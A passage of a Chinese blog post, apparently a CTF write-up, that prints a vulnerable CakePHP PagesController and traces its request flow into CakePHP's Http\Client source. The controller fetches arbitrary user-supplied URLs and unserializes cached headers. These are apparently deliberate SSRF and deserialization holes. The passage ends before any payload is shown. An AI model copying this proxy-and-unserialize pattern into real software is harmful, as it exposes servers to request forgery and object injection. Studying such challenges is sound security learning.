class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$headers</span>, <span class="variable">$body</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headers = <span class="variable">$headers</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body = <span class="variable">$body</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = [</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span> =&gt; <span class="variable">$headers</span>, </span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$http</span>-&gt;<span class="variable">$method</span>(<span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;pages&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getEnv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">        <span class="variable">$index</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;mycache/%s/%s/&#x27;</span>, <span class="variable">$ip</span>, <span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">return</span> CACHE . <span class="variable">$index</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cache_dir</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_cache_dir</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$cache_dir</span>) ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$cache_dir</span>, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$cache_dir</span> . <span class="string">&quot;body.cache&quot;</span>, <span class="variable">$response</span>-&gt;body);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$cache_dir</span> . <span class="string">&quot;headers.cache&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$response</span>-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cache_dir</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_cache_dir</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$cache_dir</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>   = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cache_dir</span> . <span class="string">&quot;/body.cache&quot;</span>);</span><br><span class="line">            <span class="variable">$headers</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cache_dir</span> . <span class="string">&quot;/headers.cache&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$body</span> = <span class="string">&quot;&lt;!-- from cache --&gt;\n&quot;</span> . <span class="variable">$body</span>;</span><br><span class="line">            <span class="variable">$headers</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$headers</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DymmyResponse</span>(<span class="variable">$headers</span>, <span class="variable">$body</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params">...<span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$request</span>  = <span class="variable language_">$this</span>-&gt;request;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getQuery</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">        <span class="variable">$url</span>  = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getQuery</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$url</span>) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">back</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$scheme</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$scheme</span>) == <span class="number">0</span> || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$scheme</span>, [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">back</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getMethod</span>());</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">back</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$headers</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getHeaders</span>() <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$key</span>), [<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>, <span class="string">&#x27;expect&#x27;</span>, <span class="string">&#x27;content-length&#x27;</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$value</span>) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$headers</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_get</span>(<span class="variable">$key</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$response</span>) &#123;</span><br><span class="line">                <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">httpclient</span>(<span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_set</span>(<span class="variable">$key</span>, <span class="variable">$response</span>);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">httpclient</span>(<span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$response</span>-&gt;headers <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$key</span>) == <span class="string">&#x27;content-type&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">type</span>(<span class="keyword">array</span>(<span class="string">&#x27;type&#x27;</span> =&gt; <span class="variable">$value</span>));</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">type</span>(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">withHeader</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">body</span>(<span class="variable">$response</span>-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要逻辑在 display 函数中，这里只关心输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params">...<span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$request</span>  = <span class="variable language_">$this</span>-&gt;request;</span><br><span class="line">     <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getQuery</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">     <span class="variable">$url</span>  = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getQuery</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;get&#x27;</span>) &#123; <span class="comment">// 如果是 GET</span></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_get</span>(<span class="variable">$key</span>); <span class="comment">// 尝试获取本地缓存</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$response</span>) &#123; <span class="comment">// 没有缓存则直接远程请求</span></span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">httpclient</span>(<span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_set</span>(<span class="variable">$key</span>, <span class="variable">$response</span>); <span class="comment">// 将请求结果放到缓存中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// POST 不缓存，直接带着 data 请求</span></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">httpclient</span>(<span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的请求方式调用了 <code>httpclient($method, $url, $headers, $data)</code> 函数，下面看看这个函数做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span> =&gt; <span class="variable">$headers</span>,</span><br><span class="line">        <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">10</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$http</span>-&gt;<span class="variable">$method</span>(<span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中才真正调用了 CakePHP 的远程请求 API<code>$http-&gt;$method($url, $data, $options)</code>，跟进到 CakePHP 的 API 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$http</span>-&gt;<span class="variable">$method</span>(<span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span>);</span><br></pre></td></tr></table></figure><p>Client 类是从 <code>Cake\Http\Client</code> 中调用的，这个类位于 <code>\vendor\cakephp\cakephp\src\Http\Client.php</code> 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setConfig</span>(<span class="variable">$config</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$adapter</span> = <span class="variable language_">$this</span>-&gt;_config[<span class="string">&#x27;adapter&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setConfig</span>(<span class="string">&#x27;adapter&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$adapter</span>)) &#123;</span><br><span class="line">        <span class="variable">$adapter</span> = <span class="keyword">new</span> <span class="variable">$adapter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapter = <span class="variable">$adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;_config[<span class="string">&#x27;cookieJar&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_cookies = <span class="variable language_">$this</span>-&gt;_config[<span class="string">&#x27;cookieJar&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setConfig</span>(<span class="string">&#x27;cookieJar&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_cookies = <span class="keyword">new</span> <span class="title class_">CookieCollection</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a GET request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* The $data argument supports a special `_content` key</span></span><br><span class="line"><span class="comment">* for providing a request body in a GET request. This is</span></span><br><span class="line"><span class="comment">* generally not used, but services like ElasticSearch use</span></span><br><span class="line"><span class="comment">* this feature.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $data The query data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$data</span> = [], <span class="keyword">array</span> <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_mergeOptions</span>(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$body</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;_content&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$body</span> = <span class="variable">$data</span>[<span class="string">&#x27;_content&#x27;</span>];</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="string">&#x27;_content&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildUrl</span>(<span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_doRequest</span>(</span><br><span class="line">        <span class="title class_">Request</span>::<span class="variable constant_">METHOD_GET</span>,</span><br><span class="line">        <span class="variable">$url</span>,</span><br><span class="line">        <span class="variable">$body</span>,</span><br><span class="line">        <span class="variable">$options</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a POST request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The post data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$data</span> = [], <span class="keyword">array</span> <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_mergeOptions</span>(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildUrl</span>(<span class="variable">$url</span>, [], <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_doRequest</span>(<span class="title class_">Request</span>::<span class="variable constant_">METHOD_POST</span>, <span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数最后进行请求的时候都调用了<code>$this-&gt;_doRequest(Request::METHOD_POST|Request::METHOD_GET, $url, $data, $options);</code>，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Helper method for doing non-GET requests.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url URL to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_createRequest</span>(</span><br><span class="line">        <span class="variable">$method</span>,</span><br><span class="line">        <span class="variable">$url</span>,</span><br><span class="line">        <span class="variable">$data</span>,</span><br><span class="line">        <span class="variable">$options</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$request</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用了 <code>$this-&gt;_createRequest($method,$url,$data,$options);</code> 继续跟 <code>_createRequest</code> 看它对输入的 url 和 data 都做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Creates a new request object based on the parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method name.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url including query string.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Request</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$url</span>, <span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$headers</span> = <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;headers&#x27;</span>]) ? (<span class="keyword">array</span>)<span class="variable">$options</span>[<span class="string">&#x27;headers&#x27;</span>] : [];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$headers</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">_typeHeaders</span>(<span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$headers</span>[<span class="string">&#x27;Content-Type&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$headers</span>[<span class="string">&#x27;content-type&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$headers</span>[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> <span class="title class_">Request</span>(<span class="variable">$url</span>, <span class="variable">$method</span>, <span class="variable">$headers</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$cookies</span> = <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;cookies&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;cookies&#x27;</span>] : [];</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> \Cake\Http\Client\Request $request */</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;_cookies-&gt;<span class="title function_ invoke__">addToRequest</span>(<span class="variable">$request</span>, <span class="variable">$cookies</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;auth&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_addAuthentication</span>(<span class="variable">$request</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;proxy&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_addProxy</span>(<span class="variable">$request</span>, <span class="variable">$options</span>);</span><br><span class="line">    